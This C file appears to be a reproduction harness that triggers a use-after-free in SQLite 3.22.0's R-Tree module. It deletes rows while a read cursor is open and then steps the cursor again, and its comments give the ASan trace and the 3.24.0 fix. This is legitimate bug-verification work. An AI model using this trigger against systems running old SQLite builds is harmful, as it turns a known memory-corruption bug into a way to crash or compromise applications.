/* new-5 / sqlite-c8c9cdd9dd -- writing an R-Tree while a read cursor is open frees
 * RtreeNodes the cursor still references.
 *
 * rtreeUpdate() -> rtreeDeleteRowid() -> nodeRelease()/removeNode() sqlite3_free()s
 * RtreeNode structures that an *already open* rtree read cursor still holds in its
 * RtreeSearchPoint stack. When that cursor is stepped again, rtreeNext() ->
 * rtreeSearchPointPop() -> nodeRelease() reads pNode->nRef out of the freed block.
 *
 * Fixed in 3.24.0 by refusing the write outright: the fix counts active cursors and
 * returns the (then new) SQLITE_LOCKED_VTAB.  In 3.22.0 there is no such guard, so
 * the nested DELETE returns SQLITE_OK -- that rc=0 is the decisive evidence that
 * this build is the vulnerable one.
 *
 * Host ASan oracle on 3.22.0, identical shape:
 *   READ of size 4, 16 bytes into a 488-byte region
 *     nodeRelease <- rtreeSearchPointPop <- rtreeNext            (the use)
 *     rtreeDeleteRowid <- rtreeUpdate                            (the free)
 *     nodeAcquire <- rtreeNodeOfFirstSearchPoint <- rtreeFilter  (the alloc)
 *
 * PRAGMA page_size=512 keeps iNodeSize (page_size-64) small so 30 rows already build
 * a 2-level tree (t1_node=3); a 1-level tree frees nothing and would PASS vacuously.
 * NOTE: -DSQLITE_DQS=0, so SQL string literals must be single-quoted. */
#include "repro322_common.h"

static void rcline(const char *what, int rc){
  out_text("rtreecursor "); out_text(what); out_text(" rc=");
  out_uint((unsigned)(rc<0?-rc:rc)); out_text("\n");
}

static int count1(sqlite3 *db, const char *sql, const char *label){
  sqlite3_stmt *st=0; int v=-1;
  if(sqlite3_prepare_v2(db,sql,-1,&st,0)==SQLITE_OK && sqlite3_step(st)==SQLITE_ROW){
    v = sqlite3_column_int(st,0);
  }
  sqlite3_finalize(st);
  out_text("rtreecursor "); out_text(label); out_text("=");
  out_uint((unsigned)(v<0?0:v)); out_text("\n");
  return v;
}

static int run_case(void){
  if (repro_init()) return 1;
  sqlite3 *db=0; char *e=0; int rc;

  rc = sqlite3_open(":memory:", &db);
  rcline("open", rc);
  if(rc!=SQLITE_OK){ sqlite3_close(db); return 1; }

  rc = sqlite3_exec(db, "PRAGMA page_size=512;", 0,0,&e);
  rcline("pagesize", rc);
  if(e){ sqlite3_free(e); e=0; }

  rc = sqlite3_exec(db, "CREATE VIRTUAL TABLE t1 USING rtree(id,x1,x2);", 0,0,&e);
  rcline("create", rc);
  if(e){ out_text("rtreecursor create err ("); out_text(e); out_text(")\n"); sqlite3_free(e); e=0; }
  if(rc!=SQLITE_OK){ sqlite3_close(db); return 1; }

  /* 30 rows via a bound statement (no CTE dependency). */
  sqlite3_stmt *ins=0;
  if(sqlite3_prepare_v2(db,"INSERT INTO t1 VALUES(?,?,?)",-1,&ins,0)!=SQLITE_OK){
    out_text("rtreecursor insert prepare err ("); out_text(sqlite3_errmsg(db)); out_text(")\n");
    sqlite3_close(db); return 1;
  }
  int i, nins=0;
  for(i=1;i<=30;i++){
    sqlite3_bind_int(ins,1,i); sqlite3_bind_int(ins,2,i); sqlite3_bind_int(ins,3,i+1);
    if(sqlite3_step(ins)==SQLITE_DONE) nins++;
    sqlite3_reset(ins);
  }
  sqlite3_finalize(ins);
  out_text("rtreecursor inserted="); out_uint((unsigned)nins); out_text("\n");

  count1(db,"SELECT count(*) FROM t1","rows");
  /* >1 means the tree really has interior nodes, so nodes CAN be freed. */
  int nnode = count1(db,"SELECT count(*) FROM t1_node","nodes");

  /* Open a read cursor and step it, then write the same rtree mid-scan. */
  sqlite3_stmt *st=0;
  if(sqlite3_prepare_v2(db,"SELECT id,x1 FROM t1",-1,&st,0)!=SQLITE_OK){
    out_text("rtreecursor scan prepare err ("); out_text(sqlite3_errmsg(db)); out_text(")\n");
    sqlite3_close(db); return 1;
  }
  int n=0, delrc=-1;
  while(sqlite3_step(st)==SQLITE_ROW){
    n++;
    if(n==3){
      out_text("rtreecursor before nested DELETE (cursor open)\n");
      delrc = sqlite3_exec(db,"DELETE FROM t1 WHERE id>3;",0,0,&e);
      /* rc=0 here == no SQLITE_LOCKED_VTAB guard == vulnerable build. */
      rcline("nested delete", delrc);
      if(e){ out_text("rtreecursor del err ("); out_text(e); out_text(")\n"); sqlite3_free(e); e=0; }
    }
  }
  /* Stepping past the DELETE is the use-after-free. */
  out_text("rtreecursor stepped="); out_uint((unsigned)n); out_text("\n");
  rcline("scan end", sqlite3_errcode(db));
  sqlite3_finalize(st);

  count1(db,"SELECT count(*) FROM t1","rows after");

  if(nnode<2) out_text("rtreecursor WARNING tree is 1 level; no node was freed\n");
  if(delrc!=SQLITE_OK) out_text("rtreecursor WARNING nested write was refused\n");

  sqlite3_close(db);
  out_text("rtreecursor NOTRAP done\n"); return 0;
}
REPRO322_MAIN("rtreecursor")
